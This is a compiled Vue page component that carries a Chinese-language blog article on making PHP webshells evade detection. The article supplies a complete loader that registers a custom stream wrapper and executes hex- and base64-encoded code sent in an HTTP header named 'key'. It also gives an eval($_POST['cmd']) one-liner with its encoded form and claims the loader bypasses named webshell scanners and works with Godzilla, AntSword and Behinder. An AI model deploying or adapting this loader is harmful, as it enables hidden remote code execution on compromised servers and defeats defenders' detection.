import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as s}from"./app-c90f8518.js";const l={},d=s(`<h2 id="webshell免杀-php" tabindex="-1"><a class="header-anchor" href="#webshell免杀-php" aria-hidden="true">#</a> webshell免杀（php）</h2><p>理论支持通杀所有PHP版本。</p><p>支持哥斯拉、蚁剑、冰蝎。</p><p>绕过长亭百川云Webshell引擎、河马webshell查杀引擎、D盾查杀。</p><p>使用方法：</p><p>添加自定义头：key=xxx</p><p>其中xxx是上述马子的base64编码再hex编码。</p><p>例如：</p><p><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p><p>经base64编码以及hex编码后：</p><p><code>5044397761484167514756325957776f4a46395154314e555779646a6257516e58536b37507a343d</code></p><p>连接时添加自定义头：</p><p><code>key: 5044397761484167514756325957776f4a46395154314e555779646a6257516e58536b37507a343d</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>
&lt;?php  
​  
# base64-&gt;hex  
# 把需要连接的webshell进行base64编码再hex编码，然后连接时，自定义请求头加上key: xxx(编码后的webshell)  
      
$header = &quot;key&quot;;  
​  
function app() {  
    include &#39;app://config.yaml&#39;;  
}  
​  
function hex2str($hex_str) {  
    if (strlen($hex_str) % 2 != 0) {  
        echo &quot;error&quot;;  
        return false;  
    }  
    $str = &#39;&#39;;  
    for ($i = 0; $i &lt; strlen($hex_str); $i += 2) {  
        $str .= chr(hexdec($hex_str[$i] . $hex_str[$i+1]));  
    }  
    return $str;  
}  
​  
class Stream {  
    private $position;  
    private $code;  
​  
    public function stream_open($path, $mode, $options, &amp;$opened_path) {  
        $url = parse_url($path);  
        $this-&gt;code = $GLOBALS[$url[&quot;host&quot;]];  
        $this-&gt;position = 0;  
        return true;  
    }  
​  
    public function stream_read($count) {  
        $result = substr($this-&gt;code, $this-&gt;position, $count);  
        $this-&gt;position += strlen($result);  
        return $result;  
    }  
​  
    public function stream_eof() {  
        return $this-&gt;position &gt;= strlen($this-&gt;code);  
    }  
​  
    public function stream_stat() {  
        return &quot;&quot;;  
    }  
}  
​  
​  
stream_wrapper_register(&quot;app&quot;, &quot;Stream&quot;) or die(&quot;error!&quot;);  
$stream = @base64_decode(hex2str($_SERVER[&quot;HTTP_&quot;.strtoupper($header)]));  
$GLOBALS[&#39;config.yaml&#39;] = $stream;  
​  
@app();
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14),r=[d];function a(t,v){return i(),n("div",null,r)}const o=e(l,[["render",a],["__file","php流包装免杀webshell.html.vue"]]);export{o as default};
